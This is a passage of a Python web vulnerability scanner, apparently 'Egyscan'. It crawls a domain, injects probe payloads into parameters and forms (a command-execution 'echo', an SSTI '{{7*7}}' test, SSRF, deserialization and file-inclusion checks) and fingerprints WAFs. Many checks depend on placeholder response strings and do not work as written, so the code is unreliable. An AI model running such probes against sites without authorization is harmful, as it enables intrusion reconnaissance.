                redirect_url = "https://www.github.com/dragonked2/Egyscan"
                response = requests.get(url + "?redirect=" + redirect_url)
                if "Redirect Successful" in response.text:
                    return (
                        True,
                        (
                            "Unvalidated Redirects: Possible unvalidated redirects"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_command_execution(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r"(exec|popen|shell_exec|system|passthru|proc_open)\s*[(\']",
            response.text,
            re.IGNORECASE,
        ):
            if re.search(r"Command Execution", response.text, re.IGNORECASE):
                command = "echo vulnerable"
                response = requests.get(url + "&command=" + command)
                if "vulnerable" in response.text:
                    return (
                        True,
                        (
                            "Command Execution: Possible command execution function"
                            " found in the response."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_cross_site_tracing(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "TRACE" in response.text or "TRACE" in response.headers:
            if re.search(r"Cross-Site Tracing", response.text, re.IGNORECASE):
                test_url = url + "/test"
                headers = {"TRACE": "1"}
                response = requests.get(test_url, headers=headers)
                if "TRACE Successful" in response.text:
                    return True, "Cross-Site Tracing: TRACE method enabled."
    except requests.RequestException:
        pass
    return False


def check_server_side_template_injection(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r"(template|render|smarty|twig|mustache|handlebars|liquid|jinja)",
            response.text,
            re.IGNORECASE,
        ):
            if re.search(
                r"Server-Side Template Injection", response.text, re.IGNORECASE
            ):
                payload = "{{7*7}}"
                response = requests.get(url + "?param=" + payload)
                if "49" in response.text:
                    return (
                        True,
                        (
                            "Server-Side Template Injection: Possible server-side"
                            " template injection detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_file_inclusion(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(
            r'(include|require|include_once|require_once)\s*["\'][^"\']+\.php["\']',
            response.text,
            re.IGNORECASE,
        ):
            if re.search(r"File Inclusion", response.text, re.IGNORECASE):
                include_url = url + "?file=config"
                response = requests.get(include_url)
                if "Include Successful" in response.text:
                    return (
                        True,
                        (
                            "File Inclusion: Possible file inclusion vulnerability"
                            " detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_privilege_escalation(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(admin|root|superuser)", response.text, re.IGNORECASE):
            if re.search(r"Privilege Escalation", response.text, re.IGNORECASE):
                user = "admin"
                response = requests.get(url + "?user=" + user)
                if "Privilege Escalation Successful" in response.text:
                    return (
                        True,
                        "Privilege Escalation: Possible privilege escalation detected.",
                    )
    except requests.RequestException:
        pass
    return False


def check_xml_injection(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"<\s*[\w-]+:?\w+.*?>", response.text):
            if re.search(r"XML Injection", response.text, re.IGNORECASE):
                payload = "<user><name>John Doe</name></user>"
                response = requests.post(url, data=payload)
                if "Injection Successful" in response.text:
                    return True, "XML Injection: Possible XML injection detected."
    except requests.RequestException:
        pass
    return False


def check_weak_cryptography(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "SSL" in response.headers or "TLS" in response.headers:
            if re.search(r"Weak Cryptography", response.text, re.IGNORECASE):
                test_url = url.replace("http://", "https://")
                response = requests.get(test_url)
                if "HTTPS Connection Successful" in response.text:
                    return (
                        True,
                        "Weak Cryptography: Possible weak cryptography detected.",
                    )
    except requests.RequestException:
        pass
    return False


def check_deserialization_vulnerabilities(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(unserialize|deserialize)", response.text, re.IGNORECASE):
            if re.search(
                r"Deserialization Vulnerabilities", response.text, re.IGNORECASE
            ):
                serialized_data = "TzozOiJkZXNpZ25hdGlvbmFsIjtiYXNlNjRfZGVzdHJveSI7czoxMDoiYmFzZTY0X3N0b3JhZ2UiO30="
                response = requests.get(url + "?data=" + serialized_data)
                if "Deserialization Successful" in response.text:
                    return (
                        True,
                        (
                            "Deserialization Vulnerabilities: Possible deserialization"
                            " vulnerability detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


def check_server_side_request_forgery(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if re.search(r"(SSRF|url=|uri=)", response.text, re.IGNORECASE):
            if re.search(r"Server-Side Request Forgery", response.text, re.IGNORECASE):
                target_url = "https://www.google.com"
                response = requests.get(url + "?target=" + target_url)
                if "Request Successful" in response.text:
                    return (
                        True,
                        (
                            "Server-Side Request Forgery: Possible server-side request"
                            " forgery detected."
                        ),
                    )
    except requests.RequestException:
        pass
    return False


session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=100)
session.mount("http://", adapter)
session.mount("https://", adapter)

response_cache = {}


def get_response(url, response_cache):
    if url in response_cache:
        return response_cache[url]
    else:
        response = session.get(url)
        response_cache[url] = response
        return response


def get_url_status(url, session):
    response = session.head(url)
    return response.status_code


def collect_urls(target_url, max_urls=500, num_threads=10, session=None):
    parsed_target_url = urlparse(target_url)
    target_domain = parsed_target_url.netloc

    urls_to_process = set()
    processed_urls = set()
    urls_to_process.add(target_url)
    urls_collected = 0

    def extract_urls_from_html(html, base_url):
        soup = BeautifulSoup(html, "html.parser")
        extracted_urls = set()
        for link in soup.find_all("a", href=True):
            url = link["href"]
            absolute_url = urljoin(base_url, url)
            extracted_urls.add(absolute_url)
        return extracted_urls

    def filter_urls_for_domain(urls, target_domain, processed_urls):
        filtered_urls = set()
        for url in urls:
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            if domain == target_domain or domain.endswith("." + target_domain):
                if url not in processed_urls:
                    filtered_urls.add(url)
        return filtered_urls

    def process_url(current_url):
        nonlocal urls_to_process, processed_urls, urls_collected
        try:
            if current_url.startswith("javascript:"):
                return set()

            response = get_response(current_url, response_cache)
            if response.status_code == 200:
                extracted_urls = extract_urls_from_html(response.text, current_url)
                filtered_urls = filter_urls_for_domain(
                    extracted_urls, target_domain, processed_urls
                )

                with processed_urls_lock:
                    processed_urls.update(filtered_urls)

                with urls_lock:
                    urls_to_process.update(filtered_urls)

                urls_collected += 1
                if urls_collected >= max_urls:
                    return set()
        except requests.exceptions.RequestException as e:
            logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
        except Exception as e:
            logging.error(f"Error occurred for URL: {current_url}, Error: {e}")

        return set()

    with tqdm.tqdm(
        total=len(urls_to_process),
        desc="Collecting URLs",
        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}",
    ) as pbar:
        processed_urls_lock = threading.Lock()
        urls_lock = threading.Lock()
        task_queue = []

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            while urls_to_process:
                current_urls = list(urls_to_process)
                urls_to_process.clear()
                task_queue.extend(current_urls)

                results = list(executor.map(process_url, task_queue))
                task_queue.clear()

                pbar.total = len(urls_to_process) + len(processed_urls)
                pbar.update(len(current_urls))

                if urls_collected >= max_urls:
                    break

    return processed_urls


detected_wafs = []

common_wafs = {
    "cloudflare": ["cloudflare", "__cfduid", "cf-ray", "cf-cache-status"],
    "akamai": ["akamai-gtm", "akamai-origin-hop", "akamai-policy", "akamai-edgescape"],
    "sucuri": ["sucuri/", "sucuri_cloudproxy"],
    "incapsula": ["incap_ses", "visid_incap", "nlbielc", "incap_user"],
    "mod_security": ["mod_security", "mod_security_crs"],
    "f5_big_ip": ["f5_bigip"],
    "fortinet": ["fortiwaf"],
    "barracuda": ["barra_counter_session"],
    "imperva": ["incap_ses", "visid_incap", "nlbielc", "incap_user"],
    "citrix": ["citrix_ns_id", "citrix_ns_id_nocache"],
    "aws_waf": ["awselb", "awselb/"],
    "dosarrest": ["dosarrest"],
    "netlify": ["netlify"],
    "akamai_ghost": ["akamai_ghost"],
    "radware_appwall": ["radware_appwall"],
    "snapt": ["_snapt"],
    "wallarm": ["_wa_"],
    "approach": ["approach"],
    "baidu_waf": ["baidu_waf", "baidu_uda"],
    "beyond_security": ["beyond_security"],
    "binarysec": ["binarysec"],
    "bitgravity": ["bitgravity"],
    "cache_fly": ["cache_fly"],
    "checkpoint": ["citrix_adc", "citrix_application_delivery_controller"],
    "comodo_cwatch": ["comodo_cwatch"],
    "denyall": ["denyall"],
    "edgecast": ["edgecast"],
    "limelight": ["limelight"],
    "mission_control": ["mission_control"],
    "netcontinuum": ["netcontinuum"],
    "perimeterx": ["perimeterx"],
    "profense": ["profense"],
    "reblaze": ["reblaze"],
    "rs_firewall": ["rs_firewall"],
    "sitelock": ["sitelock"],
    "usenix": ["usenix"],
    "varnish": ["varnish"],
    "vesystem": ["vesystem"],
    "vidado": ["vidado"],
}


def make_request(url, data=None, method="GET", headers=None):
    user_agent = random.choice(USER_AGENTS)
    request_headers = {"User-Agent": user_agent}
    if headers:
        request_headers.update(headers)
    try:
        with requests.request(
            method=method, url=url, data=data, headers=request_headers
        ) as response:
            return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {url}: {e}")
        return None


def scan_for_vulnerabilities(url, payloads, headers=None, tokens=None, threads=10):
    def inject_payloads(form):
        form_action = form.get("action")
        if form_action:
            if not form_action.startswith("http"):
                form_action = urljoin(base_url, form_action)
            form_inputs = form.find_all(["input", "textarea"])
            form_data = {
                input_field.get("name"): input_field.get("value")
                for input_field in form_inputs
            }

            if tokens:
                form_data.update(tokens)

            for param, param_values in form_data.items():
                for param_value in param_values:
                    for payload in payloads:
                        injected_form_data = form_data.copy()
                        injected_form_data[param] = param_value + payload

                        injected_form = BeautifulSoup("", "html.parser")
                        injected_form.name = "form"
                        injected_form["action"] = form_action
                        injected_form["method"] = form.get("method", "post")

                        for field_name, field_value in injected_form_data.items():
                            input_tag = injected_form.new_tag("input")
                            input_tag["type"] = "hidden"
                            input_tag["name"] = field_name
                            input_tag["value"] = field_value
                            injected_form.append(input_tag)

                        injected_url = injected_form["action"]
                        response = make_request(
                            injected_url,
                            data=str(injected_form),
                            method=injected_form["method"],
                        )
                        if response:
                            scan_response(response)

    def scan_response(response):
        for check_func, vulnerability_type in vulnerability_checks.items():
            if check_func(response.url):
                print(f"{vulnerability_type} {response.url}")
                vulnerable_urls.add(response.url)

        for waf_name, waf_signatures in common_wafs.items():
            for signature in waf_signatures:
                if signature.lower() in response.headers.get("Server", "").lower():
                    detected_wafs.append(waf_name)

    def inject_payloads_into_params(url):
        parsed_url = urlparse(url)
        query_parameters = parse_qs(parsed_url.query)

        for param, param_values in query_parameters.items():
            for param_value in param_values:
                for payload in payloads:
                    new_query_params = query_parameters.copy()
                    new_query_params[param] = param_value + payload
                    new_query_string = "&".join(
                        [f"{k}={v}" for k, v in new_query_params.items()]
                    )
                    new_url = parsed_url._replace(query=new_query_string).geturl()
                    response = make_request(new_url, headers=headers)
                    if response:
                        scan_response(response)

    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    vulnerable_urls = set()
    detected_wafs = []

    response = make_request(url, headers=headers)
    if response:
        scan_response(response)

    inject_payloads_into_params(url)

    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    form_chunks = [forms[i : i + threads] for i in range(0, len(forms), threads)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(inject_payloads, forms)

    if detected_wafs:
        print("Detected WAFs:")
        for waf in detected_wafs:
            print(f"- {waf}")

    return vulnerable_urls


vulnerability_checks = {
    check_sqli: "SQL Injection\n \n",
    check_rce: "Remote Code Execution\n \n",
    check_xss: "Cross-Site Scripting \n \n",
    check_lfi: "Local File Inclusion\n \n",
    check_open_redirect: "Open Redirect\n \n",
    check_backup_files: "Backup Files\n \n",
    check_database_exposure: "Database Exposure\n \n",
    check_directory_listings: "Directory Listings\n \n",
    check_sensitive_information: "Sensitive Information\n \n",
    check_xxe: "XML External Entity Injection\n \n",
    check_ssrf: "Server-Side Request Forgery\n \n",
    check_rfi: "Remote File Inclusion\n \n",
    check_log_files: "Log File Disclosure\n \n",
    check_idor: "Insecure Direct Object Reference\n \n",
    check_cors: "Cross-Origin Resource Sharing\n \n",
    check_csrf: "Cross-Site Request Forgery\n \n",
    check_command_injection: "Command Injection\n \n",
    check_file_upload_vulnerabilities: "File Upload Vulnerabilities\n \n",
    check_authentication_bypass: "Authentication Bypass\n \n",
    check_insecure_configuration: "Insecure Configuration\n \n",
    check_server_misconfiguration: "Server Misconfiguration\n \n",
    check_injection_flaws: "Injection Flaws\n \n",
    check_weak_session_management: "Weak Session Management\n \n",
    check_clickjacking: "Clickjacking\n \n",
    check_host_header_injection: "Host Header Injection\n \n",
    check_remote_file_execution: "Remote File Execution\n \n",
    check_brute_force_attacks: "Brute Force Attacks\n \n",
    check_security_misconfiguration: "Security Misconfiguration\n \n",
    check_missing_authentication: "Missing Authentication\n \n",
    check_crlf_injection: "CRLF Injection\n \n",
    check_session_fixation: "Session Fixation\n \n",
    check_unvalidated_redirects: "Unvalidated Redirects\n \n",
    check_command_execution: "Command Execution\n \n",
    check_cross_site_tracing: "Cross-Site Tracing\n \n",
    check_server_side_template_injection: "Server-Side Template Injection\n \n",
    check_file_inclusion: "File Inclusion\n \n",
    check_privilege_escalation: "Privilege Escalation\n \n",
    check_xml_injection: "XML Injection\n \n",
    check_weak_cryptography: "Weak Cryptography\n \n",
    check_deserialization_vulnerabilities: "Deserialization Vulnerabilities\n \n",
    check_server_side_request_forgery: "Server-Side Request Forgery\n \n",
}


def save_vulnerable_urls(vulnerable_urls):
    """Append found vulnerable URLs to a file."""
    with open("vulnerable_urls.txt", "a") as file:
        for url in vulnerable_urls:
            file.write(url + "\n")


def print_colorful(message, color=Fore.GREEN):
    """Print messages in color."""
    print(color + message + Style.RESET_ALL)


def print_warning(message):
    """Print warnings in cyan."""
    print_colorful("\n[Bingo] " + message, Fore.CYAN)


def print_error(message):
    """Print errors in red."""
    print_colorful("[Error] " + message, Fore.RED)


def print_info(message):
    """Print information in magenta."""
    print_colorful("[Info] " + message, Fore.MAGENTA)


def collect_urls_from_file(file_path):
    """Collect URLs from a given file path."""
    try:
        with open(file_path, "r") as file:
            websites = file.read().splitlines()
        return websites
    except FileNotFoundError:
        print_error(f"File '{file_path}' not found.")
        return []


def get_target_url():
    """Prompt user to enter a URL and parse it to ensure it includes a scheme."""
    target_url = input("Enter the target URL to scan for vulnerabilities: ")
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme:
        target_url = "http://" + target_url
    return target_url


def main():
    print_logo()
    while True:
        user_choice = input(
            "Choose an option:\n1. Enter the target URL to scan for vulnerabilities\n2. Load a list of websites from a txt file\nEnter your choice (1 or 2): "
        )
        if user_choice == "1":
            target_url = get_target_url()

            urls = collect_urls(target_url)
            print(f"Found {len(urls)} URLs to scan.")
            vulnerable_urls = scan_urls(urls)
            save_vulnerable_urls(vulnerable_urls)
            break
        elif user_choice == "2":
            file_path = input(
                "Enter the path of the txt file containing the list of websites: "
            )
            websites = collect_urls_from_file(file_path)
            if not websites:
                print_error("No websites loaded from the file.")
                continue
            print_info(f"Loaded {len(websites)} websites from the file.")
            vulnerable_urls = scan_websites(websites)
            save_vulnerable_urls(vulnerable_urls)
            break
        else:
            print_error("Invalid choice. Please choose option 1 or 2.")


def scan_urls(urls):
    print_info("Scanning collected URLs for vulnerabilities...")
    vulnerable_urls = set()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [
            executor.submit(scan_for_vulnerabilities, url, PAYLOADS, vulnerable_urls)
            for url in urls
        ]
        for future in tqdm(
            concurrent.futures.as_completed(futures),
            total=len(futures),
            desc="Scanning Website",
            unit="URL",
        ):
            try:
                future.result()
            except Exception as e:
                print_error(f"Error occurred while scanning URL: {e}")
    print_info("Scanning completed!")
    return vulnerable_urls


def scan_websites(websites):
    print_info("Scanning websites from the file...")
    vulnerable_urls = set()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(collect_urls, website) for website in websites]
        for future in tqdm(
            concurrent.futures.as_completed(futures),
            total=len(futures),
            desc="Scanning Websites",
            unit="Website",
        ):
            try:
                urls = future.result()
                for url in urls:
                    executor.submit(
                        scan_for_vulnerabilities, url, PAYLOADS, vulnerable_urls
                    )
            except Exception as e:
                print_error(f"Error occurred while scanning website: {e}")
    print_info("Scanning completed!")
    return vulnerable_urls


if __name__ == "__main__":
    main()
